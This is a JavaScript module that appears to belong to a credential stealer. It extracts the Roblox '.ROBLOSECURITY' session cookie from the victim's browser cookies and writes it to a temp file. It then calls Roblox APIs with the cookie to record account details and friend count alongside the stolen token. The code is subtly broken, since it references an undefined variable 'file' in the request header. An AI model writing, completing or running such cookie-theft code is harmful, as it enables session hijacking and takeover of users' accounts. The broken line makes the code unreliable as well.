const { join } = require('path');
const fs = require('fs');
const { searchForFile } = require('../util/dir');
const axios = require('axios');
const { writeFileSync } = require('fs');
const { getCookies } = require('../util/cookies');
const { getTempFolder } = require('../util/init');

module.exports = async () => {
  const cookies = await getCookies();
  const cookieValue = cookies?.find(cookie => cookie.host.includes('.roblox.com') && cookie.name === '.ROBLOSECURITY');
  if (!cookieValue) return;
  const { value: cookie, source } = cookieValue;
  fs.writeFileSync(join(getTempFolder(), 'Roblox Cookie.txt'), cookie);

  const jsonFile = join(getTempFolder(), 'Roblox.json');
  const config = { headers: { Cookie: '.ROBLOSECURITY=' + file.replaceAll('"', '') } };
  const account = await axios.get('https://www.roblox.com/mobileapi/userinfo', config);
  const friendsCount = await axios.get('https://friends.roblox.com/v1/my/friends/count', config) || undefined;
  account.data.source = source;
  account.data.cookie = cookie;
  account.data.friendsCount = friendsCount.data.count;
  writeFileSync(jsonFile, JSON.stringify(account.data));
};
